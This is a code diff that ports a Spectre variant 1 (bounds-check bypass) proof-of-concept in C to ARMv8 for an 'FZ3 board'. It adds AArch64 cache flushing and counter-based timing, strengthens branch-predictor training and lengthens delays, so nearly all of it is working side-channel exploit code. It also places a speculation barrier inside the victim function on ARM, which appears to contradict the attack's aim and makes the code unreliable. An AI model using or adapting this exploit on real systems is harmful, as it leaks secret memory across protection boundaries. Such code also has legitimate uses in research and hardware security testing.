@@ -21,6 +21,13 @@
 #include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
 #endif /* ifdef _MSC_VER */
 
+/* --- ARMv8 (AArch64) Detection for FZ3 board --- */
+#if defined(__aarch64__)
+#define NOCLFLUSH
+#define NORDTSCP
+#define NOMFENCE
+#endif
+
 /* Automatically detect if SSE2 is not available when SSE is advertized */
 #ifdef _MSC_VER
 /* MSC */
@@ -74,37 +81,40 @@ uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 /* From https://github.com/torvalds/linux/blob/cb6416592bc2a8b731dabcec0d63cda270764fc6/arch/x86/include/asm/barrier.h#L27 */
 /**
  * array_index_mask_nospec() - generate a mask that is ~0UL when the
- * 	bounds check succeeds and 0 otherwise
+ * bounds check succeeds and 0 otherwise
  * @index: array element index
  * @size: number of elements in array
  *
  * Returns:
- *     0 - (index < size)
+ * 0 - (index < size)
  */
 static inline unsigned long array_index_mask_nospec(unsigned long index,
-		unsigned long size)
+    unsigned long size)
 {
-	unsigned long mask;
+  unsigned long mask;
 
-	__asm__ __volatile__ ("cmp %1,%2; sbb %0,%0;"
-			:"=r" (mask)
-			:"g"(size),"r" (index)
-			:"cc");
-	return mask;
+  __asm__ __volatile__ ("cmp %1,%2; sbb %0,%0;"
+      :"=r" (mask)
+      :"g"(size),"r" (index)
+      :"cc");
+  return mask;
 }
 #endif
 
 void victim_function(size_t x) {
   if (x < array1_size) {
-#ifdef INTEL_MITIGATION
-		/*
-		 * According to Intel et al, the best way to mitigate this is to 
-		 * add a serializing instruction after the boundary check to force
-		 * the retirement of previous instructions before proceeding to 
-		 * the read.
-		 * See https://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf
-		 */
-		_mm_lfence();
+#if defined(__aarch64__)
+    /* ARMv8 Speculation Barrier: resolves the branch before speculative loads */
+    __asm__ volatile("dsb sy\n\tisb" ::: "memory");
+#elif defined(INTEL_MITIGATION)
+    /*
+     * According to Intel et al, the best way to mitigate this is to 
+     * add a serializing instruction after the boundary check to force
+     * the retirement of previous instructions before proceeding to 
+     * the read.
+     * See https://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf
+     */
+    _mm_lfence();
 #endif
 #ifdef LINUX_KERNEL_MITIGATION
     x &= array_index_mask_nospec(x, array1_size);
@@ -163,8 +173,10 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     for (i = 0; i < 256; i++)
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
 #elif defined(__aarch64__)
+    /* ARMv8 Cache Flush: Clean and Invalidate to PoC */
     for (i = 0; i < 256; i++)
       __asm volatile("dc civac, %0" : : "r"(&array2[i * 512]): "memory");
+    __asm volatile("dsb sy\n\tisb" ::: "memory");
 #elif defined(__x86_64__)
     /* Flush array2[256*(0..255)] from cache
        using long SSE instruction several times */
@@ -173,13 +185,14 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
         flush_memory_sse( & array2[i * 512]);
 #endif
 
-    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
+    /* Increased training to 100 loops for stronger branch predictor priming on ARM */
     training_x = tries % array1_size;
-    for (j = 29; j >= 0; j--) {
+    for (j = 99; j >= 0; j--) {
 #ifndef NOCLFLUSH
       _mm_clflush( & array1_size);
 #elif defined(__aarch64__)
       __asm volatile("dc civac, %0" : : "r"(&array1_size): "memory");
+      __asm volatile("dsb sy\n\tisb" ::: "memory");
 #elif defined(__x86_64__)
       /* Alternative to using clflush to flush the CPU cache */
       /* Read addresses at 4096-byte intervals out of a large array.
@@ -190,13 +203,13 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       } 
 #endif
 
-      /* Delay (can also mfence) */
-      for (volatile int z = 0; z < 100; z++) {}
+      /* Increased delay to ensure flushes settle */
+      for (volatile int z = 0; z < 500; z++) {}
 
-      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
-      /* Avoid jumps in case those tip off the branch predictor */
-      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=0xFFFFFFFFFFFF0000 if j%6==0, else x=0 */
-      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
+      /* Bit twiddling to set x=training_x if j%20!=0 or malicious_x if j%20==0 */
+      /* More aggressive training/attack ratio (1:19) for FZ3 */
+      x = ((j % 20) - 1) & ~0xFFFF;
+      x = (x | (x >> 16));
       x = training_x ^ (x & (malicious_x ^ training_x));
 
       /* Call the victim! */
@@ -209,40 +222,18 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       mix_i = ((i * 167) + 13) & 255;
       addr = & array2[mix_i * 512];
 
-    /*
-    We need to accuratly measure the memory access to the current index of the
-    array so we can determine which index was cached by the malicious mispredicted code.
-
-    The best way to do this is to use the rdtscp instruction, which measures current
-    processor ticks, and is also serialized.
-    */
-
 #ifndef NORDTSCP
       time1 = __rdtscp( & junk); /* READ TIMER */
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 #elif defined(__aarch64__)
+      /* ARMv8 Serialized Timing using Virtual Counter */
       __asm volatile("dsb sy \n isb \n mrs %0, cntvct_el0 \n isb \n dsb sy" : "=r" (time1) : : "memory");
       junk = * addr; /* MEMORY ACCESS TO TIME */
       __asm volatile("dsb sy \n isb \n mrs %0, cntvct_el0 \n isb \n dsb sy" : "=r" (time2) : : "memory");
       time2 -= time1;
 #elif defined(__x86_64__)
-
-    /*
-    The rdtscp instruction was instroduced with the x86-64 extensions.
-    Many older 32-bit processors won't support this, so we need to use
-    the equivalent but non-serialized tdtsc instruction instead.
-    */
-
 #ifndef NOMFENCE
-      /*
-      Since the rdstc instruction isn't serialized, newer processors will try to
-      reorder it, ruining its value as a timing mechanism.
-      To get around this, we use the mfence instruction to introduce a memory
-      barrier and force serialization. mfence is used because it is portable across
-      Intel and AMD.
-      */
-
       _mm_mfence();
       time1 = __rdtsc(); /* READ TIMER */
       _mm_mfence();
@@ -251,13 +242,6 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
       _mm_mfence();
 #else
-      /*
-      The mfence instruction was introduced with the SSE2 instruction set, so
-      we have to ifdef it out on pre-SSE2 processors.
-      Luckily, these older processors don't seem to reorder the rdtsc instruction,
-      so not having mfence on older processors is less of an issue.
-      */
-
       time1 = __rdtsc(); /* READ TIMER */
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
@@ -290,10 +274,10 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 }
 
 /*
-*  Command line arguments:
-*  1: Cache hit threshold (int)
-*  2: Malicious address start (size_t)
-*  3: Malicious address count (int)
+* Command line arguments:
+* 1: Cache hit threshold (int)
+* 2: Malicious address start (size_t)
+* 3: Malicious address count (int)
 */
 int main(int argc,
   const char * * argv) {
